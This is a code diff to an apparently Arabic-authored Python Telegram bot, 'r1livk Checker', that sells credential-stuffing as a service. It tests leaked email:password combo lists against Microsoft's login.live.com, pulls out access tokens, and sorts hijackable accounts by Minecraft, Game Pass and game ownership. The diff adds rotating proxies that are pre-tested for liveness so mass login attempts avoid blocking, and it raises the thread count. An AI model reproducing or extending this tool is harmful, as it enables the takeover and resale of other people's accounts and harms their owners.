@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Checker ⚡ - Telegram Bot (Strict Real Hits Only Mode + Leaderboard)
+r1livk Checker ⚡ - Telegram Bot (Ultimate Real Hits Hunter Mode + Proxy Live Filter & Leaderboard)
 """
 
 import os
@@ -26,6 +26,11 @@ bot = telebot.TeleBot(TOKEN)
 
 PREMIUM_USERS_FILE = "premium_users.txt"
 STATS_FILE = "user_stats.json"
+
+# قاموس لتخزين بروكسيات كل مستخدم بشكل مؤقت بعد الفلترة
+user_proxies = {}
+# قاموس لتتبع وضع المستخدم (هل يرفع كومبو أم بروكسيات؟)
+user_states = {}
 
 def load_json_data(filepath, default_val):
     if not os.path.exists(filepath):
@@ -67,8 +72,8 @@ def check_user_subscription(user_id):
         pass
     return False
 
-REQUEST_TIMEOUT = 25
-MAX_THREADS = 10
+REQUEST_TIMEOUT = 20
+MAX_THREADS = 15  # رفعنا السرعة شوي طالما صار عنا بروكسيات شغالين!
 
 active_scans = {}
 user_usage = {}  
@@ -138,6 +143,21 @@ def extract_url_post(text):
             url = url.replace('\\/', '/')
             return url
     return None
+
+def test_single_proxy(proxy):
+    proxies = {
+        "http": f"http://{proxy}",
+        "https": f"http://{proxy}"
+    }
+    try:
+        start_t = time.time()
+        resp = requests.get("https://login.live.com", proxies=proxies, timeout=5, verify=False)
+        if resp.status_code == 200:
+            ping = int((time.time() - start_t) * 1000)
+            return True, ping
+    except:
+        pass
+    return False, 0
 
 def fetch_xbox_extra_details_pro(session, xb_token, uhs):
     game_pass_status = "none"
@@ -213,19 +233,27 @@ def fetch_xbox_extra_details_pro(session, xb_token, uhs):
         
     return game_pass_status, []
 
-def check_single_account(combo):
+def check_single_account(combo, proxy_list=None):
     parts = combo.split(':')
     if len(parts) < 2:
         return "bad", None
 
     email = parts[0].strip()
     password = ':'.join(parts[1:]).strip()
+    
     adapter = HTTPAdapter(pool_connections=5, pool_maxsize=5)
-
     session = requests.Session()
     session.verify = False
     session.mount('https://', adapter)
     session.mount('http://', adapter)
+
+    if proxy_list and len(proxy_list) > 0:
+        import random
+        chosen_proxy = random.choice(proxy_list)
+        session.proxies = {
+            "http": f"http://{chosen_proxy}",
+            "https": f"http://{chosen_proxy}"
+        }
     
     session.headers.update({
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
@@ -274,11 +302,13 @@ def check_single_account(combo):
             'Referer': sftag_url,
             'Origin': 'https://login.live.com',
         }
+        
         login_req = session.post(url_post, data=login_data, headers=headers, allow_redirects=True, timeout=REQUEST_TIMEOUT)
         login_text = login_req.text.lower()
 
         ms_token = None
         full_url = login_req.url
+        
         if 'access_token=' in full_url:
             parsed_url = urlparse(full_url)
             fragment_qs = parse_qs(parsed_url.fragment)
@@ -288,6 +318,20 @@ def check_single_account(combo):
                 query_qs = parse_qs(parsed_url.query)
                 if 'access_token' in query_qs:
                     ms_token = query_qs['access_token'][0]
+
+        if not ms_token:
+            for hist_resp in login_req.history:
+                h_url = hist_resp.url
+                if 'access_token=' in h_url:
+                    parsed_url = urlparse(h_url)
+                    fragment_qs = parse_qs(parsed_url.fragment)
+                    if 'access_token' in fragment_qs:
+                        ms_token = fragment_qs['access_token'][0]
+                        break
+                    query_qs = parse_qs(parsed_url.query)
+                    if 'access_token' in query_qs:
+                        ms_token = query_qs['access_token'][0]
+                        break
 
         if not ms_token:
             token_match = re.search(r'access_token=([^&\s\"\']+)', login_req.text)
@@ -356,12 +400,10 @@ def check_single_account(combo):
 
         session.close()
 
-        # 🔥 شرط صارم جداً: هل الحساب يحتوي فعلاً على ميزات أو ألعاب حقيقية؟
         has_active_gp = "Active" in final_gp or has_gp_basic
         has_games = len(owned_games_list) > 0
         is_real_hit = has_mc or has_active_gp or gscore_int > 0 or has_games
 
-        # إذا كان الحساب فارغاً تماماً (0 جي، بدون ألعاب، بدون مايكروسوفت، بدون جيم باس)، نعتبره BAD فوراً
         if not is_real_hit:
             return "bad", None
 
@@ -409,10 +451,11 @@ def show_main_menu(message):
 
     markup = types.InlineKeyboardMarkup(row_width=1)
     btn_start = types.InlineKeyboardButton("⚡ Start Checker", callback_data="start_checker")
+    btn_proxy = types.InlineKeyboardButton("🌐 Upload & Filter Proxies", callback_data="upload_proxies_menu")
     btn_top = types.InlineKeyboardButton("🏆 Leaderboard (Top Users)", callback_data="show_leaderboard")
     btn_premium = types.InlineKeyboardButton("💎 Buy Premium ($15/Month)", callback_data="buy_premium")
     btn_account = types.InlineKeyboardButton("👤 My Account", callback_data="my_account")
-    markup.add(btn_start, btn_top, btn_premium, btn_account)
+    markup.add(btn_start, btn_proxy, btn_top, btn_premium, btn_account)
 
     today = str(date.today())
     if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
@@ -421,10 +464,14 @@ def show_main_menu(message):
         used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
         status_text = f"👤 Free ({used}/2500 lines today)"
 
+    p_count = len(user_proxies.get(chat_id, []))
+    proxy_status = f"🌐 Active Proxies: {p_count}" if p_count > 0 else "🌐 Proxies: Direct (No Proxy)"
+
     text = (
-        "⚡ **r1livk Checker Pro (Real Hits Only)** ⚡\n\n"
+        "⚡ **r1livk Checker Pro (Ultimate Hunter Mode)** ⚡\n\n"
         "Welcome to the ultimate account checking bot.\n"
-        f"Your Status: {status_text}\n\n"
+        f"Your Status: {status_text}\n"
+        f"{proxy_status}\n\n"
         "Click a button below to get started!"
     )
     
@@ -435,29 +482,6 @@ def show_main_menu(message):
         except:
             pass
     bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)
-
-@bot.message_handler(commands=['premium'])
-def give_premium(message):
-    chat_id = message.chat.id
-    if chat_id != OWNER_ID:
-        bot.reply_to(message, "❌ هذا الأمر مخصص لصاحب البوت فقط!")
-        return
-
-    args = message.text.split()
-    if len(args) < 2:
-        bot.reply_to(message, "⚠️ الاستخدام الصحيح:\n`/premium [User_ID]`", parse_mode="Markdown")
-        return
-
-    try:
-        target_user_id = int(args[1])
-        save_premium_user(target_user_id)
-        bot.reply_to(message, f"✅ تم تفعيل وحفظ البريميوم بنجاح للمستخدم: `{target_user_id}` 👑", parse_mode="Markdown")
-        try:
-            bot.send_message(target_user_id, "🎉 **مبروك!** تم تفعيل اشتراك البريميوم (`Unlimited`) في البوت الخاص بك.")
-        except:
-            pass
-    except ValueError:
-        bot.reply_to(message, "❌ الـ ID غير صحيح، تأكد أنه أرقام فقط.")
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
@@ -476,18 +500,30 @@ def callback_query(call):
         return
 
     if call.data == "start_checker":
+        user_states[chat_id] = "combo"
         markup = types.InlineKeyboardMarkup()
         btn_cancel = types.InlineKeyboardButton("❌ Cancel", callback_data="back_to_menu")
         markup.add(btn_cancel)
 
+        p_count = len(user_proxies.get(chat_id, []))
         text = (
-            "🎮 **r1livk Checker - Real Hits Mode**\n\n"
-            "Only real accounts with games, gamepass or minecraft will be captured:\n"
-            "• Minecraft Accounts\n"
-            "• Xbox Game Pass Active\n"
-            "• Games Inventory (Gamerscore > 0)\n\n"
-            "Send your combo file in .txt format (Direct file upload)\n"
+            "🎮 **r1livk Checker - Ultimate Hunter Mode**\n\n"
+            f"Using Proxies: {p_count} loaded\n\n"
+            "Send your combo file in `.txt` format (Direct file upload)\n"
             "Format: `email:password`"
+        )
+        bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
+
+    elif call.data == "upload_proxies_menu":
+        user_states[chat_id] = "proxy"
+        markup = types.InlineKeyboardMarkup()
+        btn_cancel = types.InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
+        markup.add(btn_cancel)
+
+        text = (
+            "🌐 **Proxy Live Filter Setup**\n\n"
+            "Send your `.txt` file containing proxies (Format: `IP:PORT`)\n"
+            "The bot will automatically test them, filter out dead ones, and keep only the fast working proxies for you!"
         )
         bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
     
@@ -520,6 +556,7 @@ def callback_query(call):
 
     elif call.data == "cancel_checker" or call.data == "back_to_menu":
         active_scans[chat_id] = False
+        user_states[chat_id] = None
         show_main_menu(call.message)
 
     elif call.data == "stop_scan":
@@ -531,11 +568,12 @@ def callback_query(call):
 
     elif call.data == "my_account":
         today = str(date.today())
+        p_count = len(user_proxies.get(chat_id, []))
         if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
-            bot.answer_callback_query(call.id, "Status: Premium / Owner (Unlimited Access)", show_alert=True)
+            bot.answer_callback_query(call.id, f"Status: Premium / Owner\nActive Proxies: {p_count}", show_alert=True)
         else:
             used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
-            bot.answer_callback_query(call.id, f"Current Status: Free\nUsed Today: {used}/2500 lines", show_alert=True)
+            bot.answer_callback_query(call.id, f"Status: Free ({used}/2500 lines)\nActive Proxies: {p_count}", show_alert=True)
 
 @bot.message_handler(content_types=['document'])
 def handle_docs(message):
@@ -545,14 +583,62 @@ def handle_docs(message):
         bot.reply_to(message, f"⚠️ يجب عليك الاشتراك في قناة البوت أولاً: {CHANNEL_USERNAME}")
         return
 
+    current_mode = user_states.get(chat_id, "combo")
+
     try:
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
 
-        local_path = f"temp_combo_{chat_id}.txt"
+        local_path = f"temp_file_{chat_id}.txt"
         with open(local_path, 'wb') as f:
             f.write(downloaded_file)
 
+        if current_mode == "proxy":
+            with open(local_path, 'r', encoding='utf-8-sig', errors='ignore') as f:
+                raw_proxies = [line.strip() for line in f if line.strip() and ':' in line]
+
+            if not raw_proxies:
+                bot.reply_to(message, "❌ الملف فارغ أو لا يحتوي على صيغة بروكسي صحيحة (`IP:PORT`).")
+                if os.path.exists(local_path): os.remove(local_path)
+                return
+
+            msg = bot.reply_to(message, f"🔄 جارٍ فحص وتصفية {len(raw_proxies)} بروكسي... يرجى الانتظار قليلاً ⏳")
+            
+            working_proxies = []
+            lock = threading.Lock()
+
+            def proxy_worker(proxy):
+                is_working, _ = test_single_proxy(proxy)
+                if is_working:
+                    with lock:
+                        working_proxies.append(proxy)
+
+            with ThreadPoolExecutor(max_workers=30) as executor:
+                executor.map(proxy_worker, raw_proxies)
+
+            user_proxies[chat_id] = working_proxies
+            user_states[chat_id] = "combo"
+
+            if os.path.exists(local_path): os.remove(local_path)
+
+            markup = types.InlineKeyboardMarkup()
+            btn_start = types.InlineKeyboardButton("⚡ ابدأ الفحص الآن", callback_data="start_checker")
+            btn_menu = types.InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="back_to_menu")
+            markup.add(btn_start, btn_menu)
+
+            bot.edit_message_text(
+                f"✅ **تم الانتهاء من تصفية البروكسيات بنجاح!**\n\n"
+                f"📥 اجمالي الفاحصة: `{len(raw_proxies)}`\n"
+                f"🟢 البروكسيات الشغالة (الكلين): `{len(working_proxies)}`\n\n"
+                f"تم حفظهم في حسابك وجاهزين للاستخدام لرفع الهيتس بأقصى سرعة!",
+                chat_id=chat_id,
+                message_id=msg.message_id,
+                parse_mode="Markdown",
+                reply_markup=markup
+            )
+            return
+
+        # حالة معالجة الكومبو العادي
         with open(local_path, 'r', encoding='utf-8-sig', errors='ignore') as f:
             lines = [line.strip() for line in f if line.strip() and ':' in line]
 
@@ -564,14 +650,15 @@ def handle_docs(message):
             return
 
         lines = lines[:lines_to_process_count]
-        bot.reply_to(message, f"📥 File received. Processing {len(lines)} lines...")
+        p_count = len(user_proxies.get(chat_id, []))
+        bot.reply_to(message, f"📥 File received. Processing {len(lines)} lines using {p_count} active proxies...")
         active_scans[chat_id] = True
         
         username = message.from_user.username or message.from_user.first_name
         threading.Thread(target=process_checker, args=(chat_id, local_path, lines, username)).start()
 
     except Exception as e:
-        bot.reply_to(message, f"Error downloading file: {e}")
+        bot.reply_to(message, f"Error processing file: {e}")
 
 def process_checker(chat_id, filepath, lines, username):
     total = len(lines)
@@ -585,7 +672,7 @@ def process_checker(chat_id, filepath, lines, username):
     xbox_hits = 0
 
     timestamp_str = time.strftime("%Y%m%d_%H%M%S")
-    output_filename = f"r1livk_Checker_RealHits_{timestamp_str}.txt"
+    output_filename = f"r1livk_Checker_HunterHits_{timestamp_str}.txt"
     start_time = time.time()
 
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -594,7 +681,7 @@ def process_checker(chat_id, filepath, lines, username):
     markup.add(btn_stop, btn_back)
 
     initial_status_text = (
-        f"🔥 **LIVE SCAN STATS (Real Hits Only)**\n\n"
+        f"🔥 **LIVE SCAN STATS (Proxy Mode)**\n\n"
         f"📊 Total: {total}\n"
         f"✅ Checked: 0\n"
         f"❌ Bad: 0\n"
@@ -608,13 +695,14 @@ def process_checker(chat_id, filepath, lines, username):
     status_msg = bot.send_message(chat_id, initial_status_text, parse_mode="Markdown", reply_markup=markup)
 
     lock = threading.Lock()
+    current_user_proxies = user_proxies.get(chat_id, [])
 
     def worker(combo):
         nonlocal checked, hits, bad, twofa, errors, mc_hits, gp_hits, xbox_hits
         if not active_scans.get(chat_id, True):
             return
 
-        status, data = check_single_account(combo)
+        status, data = check_single_account(combo, current_user_proxies)
 
         with lock:
             checked += 1
@@ -689,7 +777,7 @@ def process_checker(chat_id, filepath, lines, username):
     completion_text = (
         f"✅ **XBOX SCAN COMPLETED!**\n\n"
         f"📊 Total Checked: {checked}\n"
-        f"🎯 Real Hits: {hits}\n"
+        f"🎯 Hunter Hits: {hits}\n"
         f"  • Minecraft: {mc_hits}\n"
         f"  • GamePass: {gp_hits}\n"
         f"  • Xbox Live: {xbox_hits}\n"
@@ -702,12 +790,12 @@ def process_checker(chat_id, filepath, lines, username):
 
     if hits > 0 and os.path.exists(output_filename):
         with open(output_filename, 'rb') as res_f:
-            bot.send_document(chat_id, res_f, caption=f"📁 Real Hits File - r1livk")
+            bot.send_document(chat_id, res_f, caption=f"📁 Hunter Hits File - r1livk")
 
     if os.path.exists(filepath):
         os.remove(filepath)
     active_scans[chat_id] = False
 
 if __name__ == "__main__":
-    print("r1livk Real Hits Checker Bot is running...")
+    print("r1livk Ultimate Hunter Checker Bot is running...")
     bot.infinity_polling()
